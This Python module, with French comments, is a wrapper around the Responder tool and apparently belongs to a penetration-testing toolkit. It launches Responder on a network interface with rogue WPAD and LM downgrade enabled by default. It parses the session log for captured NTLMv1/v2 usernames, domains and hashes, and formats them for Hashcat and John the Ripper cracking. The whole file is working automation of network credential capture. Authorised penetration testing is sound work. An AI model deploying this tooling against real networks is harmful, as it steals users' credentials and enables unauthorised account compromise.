"""Responder Wrapper — capture NTLM via Responder.

Gère le lancement et l'arrêt de Responder en arrière-plan,
parse le fichier Responder-Session.log pour extraire les hashes NTLM
capturés, et fournit un statut en temps réel.

Usage:
    wrapper = ResponderWrapper()
    await wrapper.start(interface="eth0")
    # ... attendre des captures ...
    hashes = await wrapper.get_captured_hashes()
    await wrapper.stop()
"""

from __future__ import annotations

import asyncio
import os
import re
import shutil
import signal
import tempfile
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import StrEnum
from pathlib import Path

from ..core.logging import get_logger

logger = get_logger(__name__)


# ── Modèles ─────────────────────────────────────────────────────


@dataclass
class NTLMHash:
    """Hash NTLM capturé par Responder.

    Attributes:
        hash_type: Type de hash (NTLMv1, NTLMv2).
        username: Nom d'utilisateur.
        domain: Domaine d'authentification.
        client_ip: Adresse IP du client.
        hash_value: Valeur du hash complète (format JtR/Hashcat).
        challenge: Challenge NTLM.
        timestamp: Horodatage de la capture.
        full_entry: Ligne brute du fichier de log.
    """

    hash_type: str = ""
    username: str = ""
    domain: str = ""
    client_ip: str = ""
    hash_value: str = ""
    challenge: str = ""
    timestamp: datetime | None = None
    full_entry: str = ""


@dataclass
class ResponderStatus:
    """Statut courant de Responder.

    Attributes:
        running: True si Responder est en cours d'exécution.
        pid: PID du processus Responder.
        interface: Interface réseau écoutée.
        hashes_captured: Nombre de hashes capturés.
        uptime_seconds: Temps d'exécution.
        log_file: Chemin vers le fichier de log.
        session_file: Chemin vers le fichier Responder-Session.log.
        error: Message d'erreur si échec.
    """

    running: bool = False
    pid: int | None = None
    interface: str = ""
    hashes_captured: int = 0
    uptime_seconds: float = 0.0
    log_file: str = ""
    session_file: str = ""
    error: str | None = None


class ResponderMode(StrEnum):
    """Mode de fonctionnement de Responder."""

    ALL = "ALL"
    SMB = "SMB"
    HTTP = "HTTP"
    HTTPS = "HTTPS"
    SQL = "SQL"
    FTP = "FTP"
    IMAP = "IMAP"
    POP3 = "POP3"
    SMTP = "SMTP"
    LDAP = "LDAP"
    DNS = "DNS"
    WPAD = "WPAD"


class ResponderWrapper:
    """Wrapper pour Responder — capture NTLM.

    Gère le cycle de vie de Responder :
    - start : lance Responder en arrière-plan
    - stop  : arrête Responder proprement
    - status : retourne l'état courant
    - get_captured_hashes : parse le fichier de session

    Usage:
        wrapper = ResponderWrapper()
        status = await wrapper.start("eth0")
        if status.running:
            await asyncio.sleep(30)
            hashes = await wrapper.get_captured_hashes()
            await wrapper.stop()
            print(f"Captured {len(hashes)} hashes")
    """

    def __init__(self, responder_path: str | None = None) -> None:
        self._responder_path = responder_path or shutil.which("Responder") or "Responder"
        self._available: bool | None = None
        self._process: asyncio.subprocess.Process | None = None
        self._start_time: float = 0.0
        self._interface: str = ""
        self._log_dir: str = ""
        self._session_file: str = ""

    @property
    def available(self) -> bool:
        """Vérifie si Responder est installé."""
        if self._available is not None:
            return self._available
        self._available = shutil.which(self._responder_path) is not None
        return self._available

    def check_installation(self) -> str:
        """Retourne l'état d'installation de Responder."""
        if self.available:
            return f"Responder est installé : {shutil.which(self._responder_path)}"
        return (
            "Responder n'est pas installé.\n"
            "  git clone https://github.com/lgandx/Responder\n"
            "  cd Responder\n"
            "  python3 Responder.py\n"
            "  Assurez-vous que python3-impacket est installé."
        )

    # ══════════════════════════════════════════════════════════════
    # Gestion du cycle de vie
    # ══════════════════════════════════════════════════════════════

    async def start(
        self,
        interface: str,
        mode: ResponderMode = ResponderMode.ALL,
        wpad: bool = True,
        lm_downgrade: bool = True,
        log_dir: str | None = None,
        **extra_args: str,
    ) -> ResponderStatus:
        """Lance Responder en arrière-plan.

        Args:
            interface: Interface réseau (ex: eth0, wlan0, tun0).
            mode: Mode Responder (ALL, SMB, HTTP, etc.).
            wpad: Activer WPAD rogue server.
            lm_downgrade: Activer le downgrade LM.
            log_dir: Répertoire de logs (défaut: temporaire).
            **extra_args: Arguments supplémentaires pour Responder.

        Returns:
            ResponderStatus initial.
        """
        if not self.available:
            return ResponderStatus(
                interface=interface,
                error="Responder n'est pas installé",
            )

        # Arrêter une instance précédente si existante
        if self._process and self._process.returncode is None:
            await self.stop()

        # Créer un répertoire de logs
        self._log_dir = log_dir or tempfile.mkdtemp(prefix="responder_")
        self._interface = interface

        args = [
            self._responder_path,
            "-I",
            interface,
            "-w" if wpad else "-W",
            "--lm" if lm_downgrade else "--no-lm",
            "-o",  # Mode off (pas d'OS fingerprint)
            "-v",  # Verbose
        ]

        # Mode spécifique
        if mode != ResponderMode.ALL:
            args.extend(["-m", mode.value])

        # Ajouter les arguments supplémentaires
        for key, value in extra_args.items():
            opt = f"-{key.replace('_', '-')}"
            if isinstance(value, bool) and value:
                args.append(opt)
            elif not isinstance(value, bool):
                args.extend([opt, str(value)])

        logger.info("responder_start", interface=interface, mode=mode.value)

        try:
            self._process = await asyncio.create_subprocess_exec(
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self._log_dir,
            )

            self._start_time = time.monotonic()

            # Attendre un peu pour vérifier que Responder démarre
            await asyncio.sleep(2)

            if self._process.returncode is not None and self._process.returncode != 0:
                _, stderr = await self._process.communicate()
                error_msg = stderr.decode("utf-8", errors="replace")[:500]
                logger.error("responder_start_failed", error=error_msg)
                return ResponderStatus(
                    interface=interface,
                    error=error_msg,
                )

            # Localiser le fichier Responder-Session.log
            self._session_file = self._find_session_file(self._log_dir)

            status = self.status()
            logger.info("responder_running", pid=status.pid, interface=interface)
            return status

        except FileNotFoundError:
            return ResponderStatus(
                interface=interface,
                error=f"Binaire Responder introuvable : {self._responder_path}",
            )
        except Exception as exc:
            logger.exception("responder_start_exception", error=str(exc))
            return ResponderStatus(
                interface=interface,
                error=str(exc),
            )

    async def stop(self) -> bool:
        """Arrête Responder proprement.

        Envoie SIGTERM puis SIGKILL si nécessaire.

        Returns:
            True si arrêté avec succès.
        """
        if not self._process or self._process.returncode is not None:
            self._reset_state()
            return True

        try:
            logger.info("responder_stop", pid=self._process.pid)

            # SIGTERM
            self._process.send_signal(signal.SIGTERM)
            try:
                await asyncio.wait_for(self._process.wait(), timeout=10)
            except asyncio.TimeoutError:
                # SIGKILL si pas d'arrêt propre
                self._process.send_signal(signal.SIGKILL)
                await self._process.wait()

            self._reset_state()
            logger.info("responder_stopped")
            return True

        except ProcessLookupError:
            # Process déjà terminé
            self._reset_state()
            return True
        except Exception as exc:
            logger.exception("responder_stop_error", error=str(exc))
            self._reset_state()
            return False

    def _reset_state(self) -> None:
        """Réinitialise l'état interne."""
        self._process = None
        self._start_time = 0.0
        self._interface = ""

    # ══════════════════════════════════════════════════════════════
    # Status
    # ══════════════════════════════════════════════════════════════

    def status(self) -> ResponderStatus:
        """Retourne le statut courant de Responder.

        Returns:
            ResponderStatus avec l'état actuel.
        """
        running = (
            self._process is not None
            and self._process.returncode is None
        )

        hashes = []
        if self._session_file and os.path.isfile(self._session_file):
            hashes = self._parse_session_file()

        return ResponderStatus(
            running=running,
            pid=self._process.pid if self._process else None,
            interface=self._interface,
            hashes_captured=len(hashes),
            uptime_seconds=time.monotonic() - self._start_time if self._start_time else 0.0,
            log_file=self._log_dir,
            session_file=self._session_file,
        )

    # ══════════════════════════════════════════════════════════════
    # Parsing des hashes
    # ══════════════════════════════════════════════════════════════

    async def get_captured_hashes(self) -> list[NTLMHash]:
        """Parse le fichier Responder-Session.log pour extraire les hashes.

        Retourne les hashes NTLM capturés depuis le début de la session.

        Returns:
            Liste de NTLMHash.
        """
        if not self._session_file or not os.path.isfile(self._session_file):
            return []

        try:
            return await asyncio.to_thread(self._parse_session_file)
        except Exception as exc:
            logger.exception("responder_parse_error", error=str(exc))
            return []

    def _parse_session_file(self) -> list[NTLMHash]:
        """Parse le fichier Responder-Session.log (synchrone)."""
        hashes: list[NTLMHash] = []

        try:
            with open(self._session_file, encoding="utf-8", errors="replace") as f:
                content = f.read()
        except (OSError, UnicodeError) as exc:
            logger.error("responder_session_read_error", error=str(exc))
            return []

        # Responder-Session.log contient des lignes du format :
        # [HTTP] NTLMv2 captured for: DOMAIN\\username : 1122334455667788:hash_value
        # Format hash : username::domain:challenge:hash:challenge_hash
        lines = content.splitlines()

        for line in lines:
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("["):
                continue

            # Essayer de parser le hash
            ntlm_hash = self._parse_hash_line(line)
            if ntlm_hash:
                hashes.append(ntlm_hash)

        return hashes

    def _parse_hash_line(self, line: str) -> NTLMHash | None:
        """Parse une ligne de hash du fichier session Responder.

        Formats supportés :
          - NTLMv1 : username::domain:challenge:hash:hash2
          - NTLMv2 : username::domain:challenge:hash:challenge_hash

        Args:
            line: Ligne brute du fichier.

        Returns:
            NTLMHash ou None.
        """
        line = line.strip()

        # Format NTLMv2 standard (le plus commun)
        # username::domain:challenge:NTproof:challenge_hash
        ntlmv2_pattern = re.compile(
            r"^([^:]+)::([^:]+):([a-fA-F0-9]{16}):([a-fA-F0-9]{32,}):([a-fA-F0-9]+)",
        )
        m = ntlmv2_pattern.match(line)
        if m:
            username = m.group(1).strip()
            # Enlever le préfixe DOMAIN\\ si présent
            if "\\" in username:
                parts = username.split("\\", 1)
                domain_from_user = parts[0]
                username = parts[1]
            else:
                domain_from_user = ""

            domain = m.group(2).strip() or domain_from_user
            challenge = m.group(3)
            hash_value = m.group(4)
            challenge_hash = m.group(5)

            full_hash = f"{username}::{domain}:{challenge}:{hash_value}:{challenge_hash}"

            return NTLMHash(
                hash_type="NTLMv2",
                username=username,
                domain=domain,
                hash_value=full_hash,
                challenge=challenge,
                full_entry=line,
            )

        # Format NTLMv1
        # username::domain:challenge:hash:hash2
        ntlmv1_pattern = re.compile(
            r"^([^:]+)::([^:]+):([a-fA-F0-9]{16,}):([a-fA-F0-9]{48})",  # shorter challenge format
        )
        m = ntlmv1_pattern.match(line)
        if m:
            username = m.group(1)
            if "\\" in username:
                parts = username.split("\\", 1)
                username = parts[1]
            return NTLMHash(
                hash_type="NTLMv1",
                username=username,
                domain=m.group(2),
                hash_value=line,
                challenge=m.group(3),
                full_entry=line,
            )

        return None

    # ══════════════════════════════════════════════════════════════
    # Utilitaires
    # ══════════════════════════════════════════════════════════════

    @staticmethod
    def _find_session_file(log_dir: str) -> str:
        """Trouve le fichier Responder-Session.log dans le répertoire de logs.

        Args:
            log_dir: Répertoire de logs Responder.

        Returns:
            Chemin complet du fichier de session.
        """
        log_path = Path(log_dir)

        # Responder génère Responder-Session.log directement dans
        # le répertoire courant ou dans un sous-répertoire logs/
        candidates = [
            log_path / "Responder-Session.log",
            log_path / "logs" / "Responder-Session.log",
        ]

        # Chercher aussi les fichiers .log dans les sous-répertoires
        for f in log_path.rglob("*Session*.log"):
            return str(f)

        # Chercher les fichiers .txt avec les hashes
        for f in log_path.rglob("*NTLM*.txt"):
            return str(f)

        # Fallback : utiliser le premier .log trouvé
        log_files = list(log_path.glob("*.log"))
        if log_files:
            return str(log_files[0])

        return str(candidates[0])

    @staticmethod
    def make_hashcat_format(hashes: list[NTLMHash]) -> str:
        """Convertit les hashes en format Hashcat (-m 5600 pour NTLMv2).

        Args:
            hashes: Liste de NTLMHash.

        Returns:
            Chaîne formatée pour Hashcat.
        """
        lines = []
        for h in hashes:
            if h.hash_value:
                lines.append(h.hash_value)
        return "\n".join(lines)

    @staticmethod
    def make_jtr_format(hashes: list[NTLMHash]) -> str:
        """Convertit les hashes en format John the Ripper.

        Args:
            hashes: Liste de NTLMHash.

        Returns:
            Chaîne formatée pour JtR.
        """
        lines = []
        for h in hashes:
            if h.hash_value:
                lines.append(f"$NETNTLM${h.hash_value}")
        return "\n".join(lines)
